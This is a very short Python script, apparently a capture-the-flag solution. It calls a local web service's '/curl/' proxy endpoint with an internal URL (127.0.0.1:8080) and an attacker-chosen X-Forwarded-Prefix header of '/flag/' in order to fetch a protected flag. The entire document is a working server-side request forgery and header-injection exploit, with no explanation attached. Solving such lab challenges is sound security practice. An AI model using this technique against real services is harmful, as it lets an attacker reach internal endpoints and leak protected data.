import requests 

url = "http://localhost:21001" 

r = requests.get(
    f"{url}/curl/?url=http://127.0.0.1:8080//&header_key=X-Forwarded-Prefix&header_value=/flag/",
)

print(r.text)